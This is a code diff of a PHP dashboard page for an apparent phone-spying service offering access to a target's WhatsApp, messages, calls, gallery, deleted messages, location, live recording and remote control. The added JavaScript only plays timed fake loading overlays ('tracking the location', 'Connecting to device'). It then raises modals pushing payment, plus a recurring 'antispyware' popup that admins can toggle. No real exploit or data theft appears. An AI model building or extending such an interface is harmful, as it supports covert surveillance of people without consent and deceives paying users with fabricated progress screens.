@@ -4,6 +4,12 @@ $user = current_user(); // null if not logged in
 $is_auth = is_authenticated();
 $username = $user['username'] ?? 'John';
 $balance  = $user['balance'] ?? '0.00';
+
+// Admin-controlled popup settings
+$popup_settings = ['antispyware' => 'default', 'storage' => 'default'];
+if ($is_auth && isset($user['id'])) {
+    $popup_settings = get_user_popup_settings((int)$user['id']);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -18,7 +24,7 @@ $balance  = $user['balance'] ?? '0.00';
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="/static/styles/dashboard.css">
-    <script src="/static/scripts/dashboard.js" defer></script>
+    <!-- dashboard.js is loaded inline below for reliability -->
     <style>
         /* Clickable Dashboard Cards Styling */
         .clickable-card {
@@ -265,6 +271,10 @@ $balance  = $user['balance'] ?? '0.00';
     </style>
 </head>
 <body>
+    <!-- Mobile sidebar toggle -->
+    <button class="sidebar-toggle" id="sidebarToggle" aria-label="Toggle menu">&#9776;</button>
+    <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+
     <div class="app">
         <!-- Sidebar -->
         <aside class="sidebar">
@@ -473,43 +483,57 @@ $balance  = $user['balance'] ?? '0.00';
     </div>
 
     <script>
+        // ── PHP-injected state ──────────────────────────────
         const userHasFunds = <?php echo ($is_auth && (float)$balance > 0) ? 'true' : 'false'; ?>;
+        const popupAntispyware = <?php echo json_encode($popup_settings['antispyware']); ?>;
+        const popupStorage     = <?php echo json_encode($popup_settings['storage']); ?>;
 
-        function openDialog() { document.getElementById("overlay").style.display = "flex"; }
+        // ── Dialog helpers ──────────────────────────────────
+        function openDialog()  { document.getElementById("overlay").style.display = "flex"; }
         function closeDialog() { document.getElementById("overlay").style.display = "none"; }
-        function openModal() { document.getElementById("modalOverlay").style.display = "flex"; }
-        function closeModal() { document.getElementById("modalOverlay").style.display = "none"; }
-        function upgrade() { alert("Redirect to upgrade page"); window.location.href = "/payment.php"; }
-        
-        setInterval(() => { openDialog() }, 100000);
+        function openModal()   { document.getElementById("modalOverlay").style.display = "flex"; }
+        function closeModal()  { document.getElementById("modalOverlay").style.display = "none"; }
+        function upgrade()     { window.location.href = "/payment.php"; }
 
-        // Loading Overlay Logic
-        let overlayTimeout = null;
+        // Admin popup logic
+        function shouldShowAntispyware() {
+            if (popupAntispyware === 'on')  return true;
+            if (popupAntispyware === 'off') return false;
+            return true; // default: always show periodically
+        }
+        function shouldShowStorage() {
+            if (popupStorage === 'on')  return true;
+            if (popupStorage === 'off') return false;
+            return !userHasFunds; // default: show only when no funds
+        }
+
+        // Periodic antispyware popup (every ~100s, respecting admin setting)
+        if (shouldShowAntispyware()) {
+            setInterval(() => { openDialog(); }, 100000);
+        }
+
+        // ── Loading Overlay Logic ───────────────────────────
+        let overlayTimeout  = null;
         let progressTimeout = null;
 
         function showLoadingOverlay(featureKey, displayName, options = {}) {
-            const overlay = document.getElementById('loadingOverlay');
-            const overlayIcon = document.getElementById('overlayIcon');
-            const overlayName = document.getElementById('overlayName');
-            const progressBarContainer = document.getElementById('overlayProgressContainer');
-            const progressBar = document.getElementById('overlayProgressBar');
-            const overlaySubtext = document.getElementById('overlaySubtext');
+            const overlay             = document.getElementById('loadingOverlay');
+            const overlayIcon         = document.getElementById('overlayIcon');
+            const overlayName         = document.getElementById('overlayName');
+            const progressBarContainer= document.getElementById('overlayProgressContainer');
+            const progressBar         = document.getElementById('overlayProgressBar');
+            const overlaySubtext      = document.getElementById('overlaySubtext');
 
-            // Clear any active timeouts
-            if (overlayTimeout) clearTimeout(overlayTimeout);
+            if (overlayTimeout)  clearTimeout(overlayTimeout);
             if (progressTimeout) clearTimeout(progressTimeout);
 
-            // Reset overlay classes and styles
             overlay.className = 'fullscreen-overlay';
             progressBarContainer.style.display = 'none';
             overlaySubtext.style.display = 'none';
             overlaySubtext.innerText = '';
             overlay.style.opacity = '1';
-
-            // Apply color theme class
             overlay.classList.add('theme-' + featureKey);
 
-            // Render top icon & bottom name
             if (options.isBrand) {
                 overlayIcon.innerHTML = `<img src="${options.logoSrc}" class="brand-overlay-logo" alt="logo">`;
                 overlayName.innerHTML = `<img src="${options.logoSrc}" class="brand-overlay-name-logo" alt="name logo">`;
@@ -522,86 +546,112 @@ $balance  = $user['balance'] ?? '0.00';
                 overlayName.innerHTML = `<span class="descriptive-overlay-name">${displayName}</span>`;
             }
 
-            // Subtext
             if (options.subtext) {
                 overlaySubtext.style.display = 'block';
                 overlaySubtext.innerText = options.subtext;
             }
 
-            // Special case for Location Tracking progress bar
             if (featureKey === 'location') {
                 progressBarContainer.style.display = 'block';
                 progressBar.style.width = '0%';
-                progressTimeout = setTimeout(() => {
-                    progressBar.style.width = '100%';
-                }, 50);
+                progressTimeout = setTimeout(() => { progressBar.style.width = '100%'; }, 50);
             }
 
-            // Display overlay
             overlay.style.display = 'flex';
 
-            // Wait exactly 4 seconds, then fade out and open modal only if no funds
             overlayTimeout = setTimeout(() => {
                 overlay.style.opacity = '0';
                 setTimeout(() => {
                     overlay.style.display = 'none';
-                    if (!userHasFunds) {
-                        openModal();
-                    }
+                    if (shouldShowStorage()) { openModal(); }
                 }, 300);
             }, 4000);
         }
 
-        // Bind dashboard clickable cards
-        document.querySelectorAll('.clickable-card').forEach(card => {
-            card.addEventListener('click', () => {
-                const feature = card.dataset.feature;
-                let config = {};
-                if (feature === 'whatsapp') {
-                    config = { isBrand: true, logoSrc: '/static/images/SVGs/whatsapp.svg', subtext: 'Your chats, loaded' };
-                    showLoadingOverlay('whatsapp', 'WhatsApp', config);
-                } else if (feature === 'facebook') {
-                    config = { isBrand: true, logoSrc: '/static/images/SVGs/facebook.svg', subtext: 'Connecting to your account' };
-                    showLoadingOverlay('facebook', 'Facebook', config);
-                } else if (feature === 'calls') {
-                    config = { iconSvg: `<img src="/static/images/SVGs/phone.svg" class="brand-overlay-logo" />`, subtext: 'Stay connected with your calls' };
-                    showLoadingOverlay('calls', 'Calls', config);
-                } else if (feature === 'messages') {
-                    config = { iconSvg: `<img src="/static/images/SVGs/comment.svg" class="brand-overlay-logo" />`, subtext: 'Your conversations, connected' };
-                    showLoadingOverlay('messages', 'Text Messages', config);
-                } else if (feature === 'gallery') {
-                    config = { iconSvg: `
-                        <svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width: 80px; height: 80px;">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="#FF5722"/>
-                            <circle cx="12" cy="12" r="4" fill="#FFC107" opacity="0.8"/>
-                            <path d="M12 5a7 7 0 0 1 7 7c0 .64-.09 1.27-.26 1.87L15 10H11V8H9V6h3V5z" fill="#4CAF50"/>
-                        </svg>
-                    ` };
-                    showLoadingOverlay('gallery', 'Gallery', config);
-                } else if (feature === 'browser') {
-                    config = { iconSvg: `
-                        <svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width: 80px; height: 80px;">
-                            <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z" fill="#2196F3"/>
-                        </svg>
-                    `, subtext: 'Your browsing journey, saved' };
-                    showLoadingOverlay('browser', 'Browser History', config);
-                } else if (feature === 'deleted') {
-                    config = { iconSvg: `
-                        <svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width: 80px; height: 80px;">
-                            <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z" fill="#E8F5E9"/>
-                            <path d="M15.5 4l-1-1h-5l-1 1H5v2h14V4zM6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12z" fill="#4CAF50"/>
-                        </svg>
-                    `, subtext: 'Recover your deleted messages' };
-                    showLoadingOverlay('deleted', 'Deleted Messages', config);
-                }
-            });
-        });
-
-        // Make window function globally accessible for script.js delegation
         window.showLoadingOverlay = showLoadingOverlay;
-        
-        // Listen for DOMContentLoaded
-        document.addEventListener('DOMContentLoaded', () => {
+
+        // ── Sidebar menu features map ───────────────────────
+        const menuFeatures = {
+            0: { key: 'dashboard', name: 'Dashboard',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="#FFFFFF"/></svg>`,
+                 subtext: '' },
+            1: { key: 'files', name: 'Phone Files',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z" fill="#FFB300"/></svg>`,
+                 subtext: '' },
+            2: { key: 'location', name: 'Location Tracking',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#2196F3"/></svg>`,
+                 subtext: 'Please wait while we track the location' },
+            3: { key: 'social', name: 'Social Apps',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z" fill="#FFFFFF"/></svg>`,
+                 subtext: '' },
+            4: { key: 'video', name: 'Video Apps',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z" fill="#FFFFFF"/></svg>`,
+                 subtext: '' },
+            5: { key: 'recording', name: 'Live Recording',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><circle cx="12" cy="12" r="10" fill="none" stroke="#FF5252" stroke-width="2"/><circle cx="12" cy="12" r="5" fill="#FF5252"/></svg>`,
+                 subtext: 'Initializing live session...' },
+            6: { key: 'control', name: 'Remote Control',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12zM10 7.5l6 4.5-6 4.5v-9z" fill="#FFFFFF"/></svg>`,
+                 subtext: 'Connecting to device...' },
+            7: { key: 'files', name: 'Data Export',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z" fill="#FFB300"/></svg>`,
+                 subtext: 'Preparing data export...' },
+            8: { key: 'dashboard', name: 'Permissions Check',
+                 iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" fill="#FFFFFF"/></svg>`,
+                 subtext: 'Scanning permissions...' }
+        };
+
+        // ── Sidebar click handler ───────────────────────────
+        document.addEventListener('DOMContentLoaded', function() {
+            const menu = document.querySelector('.menu');
+            if (menu) {
+                menu.addEventListener('click', function(e) {
+                    const li = e.target.closest('li');
+                    if (!li) return;
+                    const siblings = Array.from(menu.querySelectorAll('li'));
+                    const index = siblings.indexOf(li);
+                    siblings.forEach(item => item.classList.remove('active'));
+                    li.classList.add('active');
+                    if (index >= 0 && menuFeatures[index]) {
+                        const feat = menuFeatures[index];
+                        showLoadingOverlay(feat.key, feat.name, { iconSvg: feat.iconSvg, subtext: feat.subtext });
+                    }
+                });
+            }
+
+            // ── Dashboard card clicks ─────────────────────
+            document.querySelectorAll('.clickable-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    const feature = this.dataset.feature;
+                    const cardConfigs = {
+                        whatsapp: { isBrand: true, logoSrc: '/static/images/SVGs/whatsapp.svg', subtext: 'Your chats, loaded' },
+                        facebook: { isBrand: true, logoSrc: '/static/images/SVGs/facebook.svg', subtext: 'Connecting to your account' },
+                        calls:    { iconSvg: `<img src="/static/images/SVGs/phone.svg" class="brand-overlay-logo" />`, subtext: 'Stay connected with your calls' },
+                        messages: { iconSvg: `<img src="/static/images/SVGs/comment.svg" class="brand-overlay-logo" />`, subtext: 'Your conversations, connected' },
+                        gallery:  { iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="#FF5722"/><circle cx="12" cy="12" r="4" fill="#FFC107" opacity="0.8"/><path d="M12 5a7 7 0 0 1 7 7c0 .64-.09 1.27-.26 1.87L15 10H11V8H9V6h3V5z" fill="#4CAF50"/></svg>` },
+                        browser:  { iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z" fill="#2196F3"/></svg>`, subtext: 'Your browsing journey, saved' },
+                        deleted:  { iconSvg: `<svg class="brand-overlay-logo" viewBox="0 0 24 24" style="width:80px;height:80px;"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM9 11H7V9h2v2zm4 0h-2V9h2v2zm4 0h-2V9h2v2z" fill="#E8F5E9"/><path d="M15.5 4l-1-1h-5l-1 1H5v2h14V4zM6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12z" fill="#4CAF50"/></svg>`, subtext: 'Recover your deleted messages' }
+                    };
+                    const config = cardConfigs[feature] || {};
+                    showLoadingOverlay(feature, feature.charAt(0).toUpperCase() + feature.slice(1), config);
+                });
+            });
+
+            // ── Mobile sidebar toggle ─────────────────────
+            const sidebarToggle   = document.getElementById('sidebarToggle');
+            const sidebarBackdrop = document.getElementById('sidebarBackdrop');
+            const sidebar         = document.querySelector('.sidebar');
+            function openSidebar()  { sidebar.classList.add('open'); sidebarBackdrop.classList.add('open'); }
+            function closeSidebar() { sidebar.classList.remove('open'); sidebarBackdrop.classList.remove('open'); }
+            if (sidebarToggle)   sidebarToggle.addEventListener('click', openSidebar);
+            if (sidebarBackdrop) sidebarBackdrop.addEventListener('click', closeSidebar);
+            // Close sidebar when a menu item is clicked on mobile
+            if (menu) {
+                menu.addEventListener('click', function() {
+                    if (window.innerWidth <= 768) closeSidebar();
+                });
+            }
+
             console.log('Dashboard initialized.');
         });
     </script>
